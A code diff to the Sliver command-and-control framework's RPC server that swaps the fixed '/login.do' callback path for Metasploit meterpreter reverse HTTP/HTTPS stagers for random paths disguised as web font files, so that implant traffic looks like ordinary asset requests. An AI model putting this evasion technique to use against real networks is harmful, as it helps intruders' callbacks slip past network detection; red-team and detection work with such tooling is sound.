@@ -21,6 +21,9 @@ package rpc
 import (
 	"context"
 	"fmt"
+	"math/rand"
+	"path"
+	"time"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -126,10 +129,10 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 		payload = "meterpreter/reverse_tcp"
 	case clientpb.StageProtocol_HTTP:
 		payload = "meterpreter/reverse_http"
-		uri = "/login.do"
+		uri = generateCallbackURI()
 	case clientpb.StageProtocol_HTTPS:
 		payload = "meterpreter/reverse_https"
-		uri = "/login.do"
+		uri = generateCallbackURI()
 	default:
 		return MSFStage, fmt.Errorf("Protocol not supported")
 	}
@@ -158,4 +161,32 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 	MSFStage.File.Data = stage
 	MSFStage.File.Name = generate.GetCodename()
 	return MSFStage, nil
+}
+
+// Utility functions
+func generateCallbackURI() string {
+	segments := []string{"static", "assets", "fonts", "locales"}
+	// Randomly picked font while browsing on the web
+	fontNames := []string{
+		"attribute_text_w01_regular.woff",
+		"ZillaSlab-Regular.subset.bbc33fb47cf6.woff",
+		"ZillaSlab-Bold.subset.e96c15f68c68.woff",
+		"Inter-Regular.woff",
+		"Inter-Medium.woff",
+	}
+	return path.Join(randomPath(segments, fontNames)...)
+}
+
+func randomPath(segments []string, filenames []string) []string {
+	seed := rand.NewSource(time.Now().UnixNano())
+	insecureRand := rand.New(seed)
+	n := insecureRand.Intn(3) // How many segements?
+	genSegments := []string{}
+	for index := 0; index < n; index++ {
+		seg := segments[insecureRand.Intn(len(segments))]
+		genSegments = append(genSegments, seg)
+	}
+	filename := filenames[insecureRand.Intn(len(filenames))]
+	genSegments = append(genSegments, filename)
+	return genSegments
 }
